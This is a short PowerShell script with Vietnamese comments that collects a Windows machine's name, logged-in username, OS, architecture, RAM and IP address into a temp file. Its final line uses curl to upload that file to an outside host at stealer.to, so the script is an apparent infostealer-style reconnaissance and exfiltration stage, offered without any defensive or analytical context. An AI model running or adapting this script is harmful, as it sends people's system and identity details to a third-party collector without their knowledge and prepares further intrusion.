# Đường dẫn lưu file tại %temp%
$tempPath = [System.IO.Path]::Combine($env:TEMP, "infoo.txt")

# Thu thập thông tin máy tính
$computerInfo = @{
    "ComputerName" = $env:COMPUTERNAME       # Tên máy tính
    "Username" = $env:USERNAME               # Tên người dùng
    "OS" = (Get-WmiObject -Class Win32_OperatingSystem).Caption  # Hệ điều hành
    "Architecture" = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture  # Kiến trúc hệ điều hành
    "RAM (GB)" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2) # RAM
    "IP Address" = (Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString  # Địa chỉ IP
}

# Chuyển đổi thông tin thành chuỗi có định dạng dễ đọc
$infoText = @"
Thông tin hệ thống máy tính:
----------------------------------------
Tên máy tính: $($computerInfo.ComputerName)
Người dùng: $($computerInfo.Username)
Hệ điều hành: $($computerInfo.OS)
Kiến trúc: $($computerInfo.Architecture)
RAM (GB): $($computerInfo.'RAM (GB)')
Địa chỉ IP: $($computerInfo.'IP Address')
----------------------------------------
"@

# Lưu thông tin vào file infoo.txt tại %temp%
$infoText | Out-File -FilePath $tempPath -Encoding UTF8

Write-Host "Thông tin đã được lưu tại $tempPath"
cmd.exe /c "curl -F ""file=@$tempPath"" https://stealer.to/post?uniqueid=9a181e8a"
